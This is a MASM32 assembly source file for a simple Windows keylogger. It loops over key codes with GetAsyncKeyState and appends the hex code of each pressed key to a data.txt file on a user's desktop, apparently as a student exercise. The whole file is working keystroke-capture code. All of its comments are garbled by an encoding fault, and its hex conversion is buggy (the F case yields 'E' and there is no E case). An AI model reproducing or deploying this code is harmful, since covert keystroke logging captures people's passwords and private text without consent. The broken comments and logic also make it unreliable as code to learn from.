.386
.model flat, stdcall
option casemap :none


include \masm32\include\kernel32.inc
include \masm32\include\user32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib

.data

Printed_text db 'Pressed', 0
Console_handle dd ?
;�������� ����� = ������ ����������
;��� ���� ��� 16��� ������. �� ���� ������

Buffer db 100h dup (?)

Lp_file_name db 'C:\Users\Teacher\Desktop\data.txt', 0

.code
start:

    ;��������� ����� �������
    push -11
    call GetStdHandle
    mov Console_handle ,eax

Start_cycle:
    ;����� �� 1 ������������
    mov esi, 30h ;
    push 1
    call Sleep

Check_key:
    cmp esi, 05Bh ;���� esi ���� ��������� �� ����� �������� ������� �� �����
    jz Start_cycle

    ;�������� ���� �� ������ �������
    push esi
    call GetAsyncKeyState
    
    cmp eax, 0           ;is pressed eax 	!= 0
    jnz Key_pressed     ;���� ������ �������� ���� ��������� ��������� �������

Continue:

    inc esi              ;������ esi ��������� �� ������ ����������� �������
    jmp Check_key  
    

Key_pressed:
 cmp esi, 041h
 jz Exit
 call Write_to_file
 jmp Continue    


Write_to_file:
    ;��������� ASCI ���� ������� ������� �������
    push 0   
    push esi
    call MapVirtualKey
    shl eax, 16

    push 100h
    push offset Buffer 
    push eax
    call GetKeyNameTextA

    ;��������� ����������� �����
    push 0 ;-------------------------------------------------------------------------------
    push 80h
    push 4
    push 0 ;-------------------------------------------------------------------------------
    push 0 ;? if not work - it should push 2(is problems with acces)
    push 40000000h;?  winnt.h -------------------------------------------------------------------------------
    push offset Lp_file_name
    call CreateFile
            ;eax = file handler
    cmp eax, 0
    jz Exit
    mov ebx, eax
    
    
    ;��������� ���������
    push 2
    push 0
    push 0
    push ebx
    call SetFilePointer    

    ;�� ���� ���������� ����� �.� ����� ������� ������� ����� �� ���������� ������ (ASCI = 1����)

    
    ;����� � ����
    
    call GetLastError

    call Get_numbers_asci ;���������� ��������� esi 
    mov word ptr [Buffer], ax ;����� ����� mov dword [Buffer], eax ���� �������� � ������ �������� ������� ����� ���� ����

    push 0      ;-------------------------------------------------------------------------------
    push 0      ; was lpOverlapped
    push 02h    ;��� ������ ������ ����������� ������� ������ ������� 2�����
    push offset Buffer
    push ebx
    call WriteFile

    call GetLastError

    ;��������� ����������
    push ebx
    call CloseHandle

    push 100
    call Sleep
    ;�� ������ �����
    jmp Start_cycle
    
Print_message proc
        
    push 0
    push 0
    push 16d
    push offset Printed_text
    push Console_handle
    call WriteConsoleA
    
    ret
Print_message endp

Get_numbers_asci proc
;�������� ���������� ����� ������� esi � ������� stdcall
    push ebp
    mov ebp, esp
    sub esp, 4

    mov [ebp-4], esi ;���������� ���������� ������ esi 

 
    ;������������ - 5A (�������� 2 �����)

    ;����� ����� ������ ����� shr esi, 4  res  - 0000000Nh
    shr esi, 4    
    ;esi ���������� �� ������ �����
    call Number_to_asci ;��������� ���������� esi. ���������� eax = asci ����
    
    
    ;����������� �������� esi
    mov esi, [ebp-4]

    ;��������� �������� eax � ��������� ����������
    mov [ebp-4], eax


    ;����������� ����� ��� ������� �����. 000n -> 00n0
    shl dword ptr [ebp-4], 8 ;?
    

    ;����� ������ �����
    btr esi, 5
    btr esi, 6
    btr esi, 7
    btr esi, 8
    ;esi ��������� �� ������ �����

    call Number_to_asci
    ;eax = asci ��� ������� �����
    ;��� ������ ��������� ������� ���� �������� eax � ������� ���� [ebp-4]
    mov [ebp-4], al ;?


    ;������ �������� ���������� ������������ ��������

    ;�������
    mov eax, [ebp-4]
    mov esp, ebp
    pop ebp
    ret 
Get_numbers_asci endp

Number_to_asci proc
    ;������� � ������� �����

    ;stdcall �� �����������
    ;�������� ���������� ������ ������� esi
    cmp esi, 0
    jz Zero_to_asci

    cmp esi, 1
    jz One_to_asci

    cmp esi, 2
    jz Two_to_asci

    cmp esi, 3
    jz Three_to_asci

    cmp esi, 4
    jz Four_to_asci

    cmp esi, 5
    jz Five_to_asci

    cmp esi, 6
    jz Six_to_asci

    cmp esi, 7
    jz Seven_to_asci

    cmp esi, 8
    jz Eight_to_asci

    cmp esi, 9
    jz Nine_to_asci

    cmp esi, 0Ah
    jz A_to_asci

    cmp esi, 0Bh
    jz B_to_asci

    cmp esi, 0Ch
    jz C_to_asci

    cmp esi, 0Dh
    jz D_to_asci
    
    jmp F_to_asci

    

Zero_to_asci:
    mov eax, 30h
    jmp Return

One_to_asci:
    mov eax, 31h
    jmp Return

Two_to_asci:
    mov eax, 32h
    jmp Return

Three_to_asci:
    mov eax, 33h
    jmp Return

Four_to_asci:
    mov eax, 34h
    jmp Return

Five_to_asci:
    mov eax, 35h
    jmp Return

Six_to_asci:
    mov eax, 36h
    jmp Return

Seven_to_asci:
    mov eax, 37h
    jmp Return

Eight_to_asci:
    mov eax, 38h
    jmp Return

Nine_to_asci:
    mov eax, 39h
    jmp Return

A_to_asci:
    mov eax, 41h
    jmp Return

B_to_asci:
    mov eax, 42h
    jmp Return

C_to_asci:
    mov eax, 43h
    jmp Return

D_to_asci:
    mov eax, 44h
    jmp Return

F_to_asci:
    mov eax, 45h
    jmp Return
    
Return:
    ret
   ;����������� �������� � eax
Number_to_asci endp

Exit:
    push 0
    call ExitProcess

end start
